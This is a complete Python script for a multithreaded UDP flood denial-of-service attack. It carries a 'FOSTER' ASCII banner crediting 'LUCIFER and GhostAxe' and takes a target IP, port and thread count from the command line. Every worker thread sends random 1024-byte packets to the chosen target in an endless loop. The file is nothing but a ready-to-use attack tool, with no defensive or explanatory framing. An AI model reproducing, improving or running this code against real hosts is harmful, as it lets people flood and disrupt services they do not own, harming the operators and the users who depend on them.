import socket
import threading
import random
import argparse

def dos_attack(target_ip, target_port):
    """Function to perform a DoS attack by sending UDP packets."""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = random._urandom(1024)

    while True:
        try:

            sock.sendto(payload, (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")

def start_attack(target_ip, target_port, thread_count):
    """Function to initiate multiple threads for the DoS attack."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
    print(r"""
███████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
█████╗  ██║   ██║███████╗   ██║   █████╗  ██████╔╝
██╔══╝  ██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
Created by LUCIFER and GhostAxe
""")
    parser = argparse.ArgumentParser(description="Perform a DoS attack by sending UDP packets.")
    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port")
    parser.add_argument("-T", "--threads", type=int, required=True, help="Number of threads to use")

    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    thread_count = args.threads

    start_attack(target_ip, target_port, thread_count)

if __name__ == "__main__":
    main()

